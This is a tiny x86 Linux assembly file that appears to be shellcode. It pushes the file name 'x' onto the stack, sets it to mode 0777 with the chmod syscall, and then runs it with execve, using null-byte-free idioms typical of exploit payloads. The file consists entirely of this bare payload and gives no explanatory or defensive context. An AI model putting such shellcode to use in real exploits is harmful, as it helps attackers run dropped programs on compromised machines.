global _start

section .text

_start:
    ;chmod x
    xor ecx,ecx
    xor eax, eax
    push eax
    mov al, 0xf
    push 0x78
    mov ebx, esp
    xor ecx, ecx
    mov cx, 0x1ff
    int 0x80
    
    ;exec x
    xor eax, eax
    push eax
    push 0x78
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80
    